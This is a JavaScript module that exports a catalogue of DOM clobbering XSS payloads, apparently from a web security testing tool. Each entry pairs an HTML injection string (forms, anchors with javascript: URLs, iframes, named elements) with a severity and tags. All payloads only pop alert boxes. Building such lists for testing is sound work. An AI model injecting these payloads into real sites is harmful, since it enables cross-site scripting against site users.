/**
 * @file dom-clobbering.js
 * @description DOM clobbering XSS vectors
 * @version 8.0.0
 */

(function() {
    'use strict';

    const DOM_CLOBBERING_PAYLOADS = {
        // ═══════════════════════════════════════════════════════════════
        // 🎯 Basic DOM Clobbering
        // ═══════════════════════════════════════════════════════════════
        basic: [
            {
                id: 'dc_001',
                payload: '<form name="x"><input name="y"></form><script>alert(x.y)</script>',
                description: 'Form and input clobbering',
                severity: 'high',
                contexts: ['html'],
                tags: ['dom-clobbering', 'form', 'input']
            },
            {
                id: 'dc_002',
                payload: '<a id="x" href="javascript:alert(1)">click</a><script>x.click()</script>',
                description: 'Anchor clobbering with javascript',
                severity: 'high',
                contexts: ['html'],
                tags: ['dom-clobbering', 'anchor', 'javascript']
            },
            {
                id: 'dc_003',
                payload: '<img name="x"><img name="x"><script>alert(x.length)</script>',
                description: 'HTMLCollection clobbering',
                severity: 'medium',
                contexts: ['html'],
                tags: ['dom-clobbering', 'collection', 'img']
            }
        ],

        // ═══════════════════════════════════════════════════════════════
        // 🔗 Window Property Clobbering
        // ═══════════════════════════════════════════════════════════════
        window: [
            {
                id: 'dc_win_001',
                payload: '<iframe name="alert" src="javascript:parent.alert(1)"></iframe>',
                description: 'Clobber window.alert via iframe',
                severity: 'critical',
                contexts: ['html'],
                tags: ['dom-clobbering', 'window', 'alert', 'iframe']
            },
            {
                id: 'dc_win_002',
                payload: '<form id="x"><input name="action" value="javascript:alert(1)"></form><script>x.submit()</script>',
                description: 'Form action clobbering',
                severity: 'high',
                contexts: ['html'],
                tags: ['dom-clobbering', 'form', 'action']
            }
        ],

        // ═══════════════════════════════════════════════════════════════
        // 🎭 Named Access Clobbering
        // ═══════════════════════════════════════════════════════════════
        namedAccess: [
            {
                id: 'dc_na_001',
                payload: '<a id="x" name="x" href="y">',
                description: 'ID and name clobbering',
                severity: 'medium',
                contexts: ['html'],
                tags: ['dom-clobbering', 'id', 'name']
            },
            {
                id: 'dc_na_002',
                payload: '<form name="x"><output name="y"></output></form>',
                description: 'Form output clobbering',
                severity: 'medium',
                contexts: ['html'],
                tags: ['dom-clobbering', 'form', 'output']
            }
        ]
    };

    // ═══════════════════════════════════════════════════════════════════
    // 🚀 Export
    // ═══════════════════════════════════════════════════════════════════
    exports.DOM_CLOBBERING_PAYLOADS = DOM_CLOBBERING_PAYLOADS;
    exports.getPayloads = () => {
        const all = [];
        for (const category in DOM_CLOBBERING_PAYLOADS) {
            all.push(...DOM_CLOBBERING_PAYLOADS[category]);
        }
        return all;
    };
})();